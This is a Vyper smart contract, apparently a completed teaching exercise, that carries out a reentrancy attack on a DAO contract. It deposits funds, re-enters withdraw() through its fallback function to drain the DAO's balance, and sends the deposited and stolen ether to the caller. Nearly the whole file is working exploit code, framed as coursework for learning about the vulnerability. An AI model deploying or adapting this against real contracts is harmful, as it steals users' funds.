interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)

deposit_amount: public(uint256)
remaining_amount: public(uint256)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS

    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    #base case
    if (self.remaining_amount <= 0):
        return True

    #recursive case
    self.remaining_amount -= self.deposit_amount
    DAO(self.dao_address).withdraw()
    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    self.owner_address = msg.sender
    deposit_amount: uint256 = msg.value

    #make sure you assign these before withdraw()
    self.deposit_amount = deposit_amount
    self.remaining_amount = dao_address.balance

    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance

    # TODO: make the deposit into the DAO
    DAO(self.dao_address).deposit(value=deposit_amount)

    # TODO: Start the reentrance attack
    DAO(self.dao_address).withdraw()

    # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
    send(self.owner_address, self.balance)

@external
@payable
def __default__():
    # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called)

    # TODO: Add code here to complete the recursive call
    self._attack()
